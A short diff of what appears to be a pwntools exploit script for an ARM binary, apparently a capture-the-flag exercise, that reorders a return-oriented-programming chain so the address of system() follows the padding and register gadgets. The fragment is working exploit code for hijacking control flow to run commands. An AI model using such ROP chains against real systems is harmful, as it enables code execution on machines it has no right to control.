@@ -20,7 +20,6 @@ mov_r0_r7_blx_r3    = p32(0x10634) # mov r0, r7 ; blx r3
 pop_r45678_sb_sl_pc = p32(0x10644) # pop {r4, r5, r6, r7, r8, sb, sl, pc}
 
 rop = b"A" * 36
-rop += p32(ELF.symbols["system"])
 rop += pop_r45678_sb_sl_pc
 rop += b"BBBB"
 rop += b"CCCC"
@@ -30,6 +29,7 @@ rop += b"EEEE"
 rop += b"FFFF"
 rop += b"GGGG"
 rop += mov_r0_r7_blx_r3
+rop += p32(ELF.symbols["system"])
 
 log.success(f"ROP chain : {rop}")
 pause()
